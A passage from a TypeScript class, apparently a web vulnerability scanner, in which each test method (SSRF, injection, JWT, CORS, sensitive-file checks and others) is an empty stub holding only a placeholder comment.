  private async performSSRFTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for SSRF testing
  }

  private async performFileInclusionTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for file inclusion testing
  }

  private async performAuthenticationTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for authentication testing
  }

  private async performSessionManagementTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for session management testing
  }

  private async performAccessControlTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for access control testing
  }

  private async performJSONInjectionTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for JSON injection testing
  }

  private async performXMLInjectionTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for XML injection testing
  }

  private async performMassAssignmentTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for mass assignment testing
  }

  private async performRateLimitingTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for rate limiting testing
  }

  private async performCORSTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for CORS testing
  }

  private async performAPIVersioningTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for API versioning testing
  }

  private async performGraphQLTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for GraphQL testing
  }

  private async performJWTTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for JWT testing
  }

  private async performCookieAnalysis(spiderResults: SpiderResult): Promise<void> {
    // Implementation for cookie analysis
  }

  private async checkMissingSecurityHeaders(url: string): Promise<void> {
    // Already implemented in performHTTPSecurityHeadersAnalysis
  }

  private async checkInsecureTransmission(url: string): Promise<void> {
    // Already implemented in performSSLTLSAnalysis
  }

  private async checkVersionDisclosure(url: string): Promise<void> {
    // Implementation for version disclosure checking
  }

  private async checkDirectoryListing(url: string): Promise<void> {
    // Implementation for directory listing checking
  }

  private async checkBackupFiles(url: string): Promise<void> {
    // Implementation for backup file checking
  }

  private async checkSensitiveFiles(url: string): Promise<void> {
    // Implementation for sensitive file checking
  }
}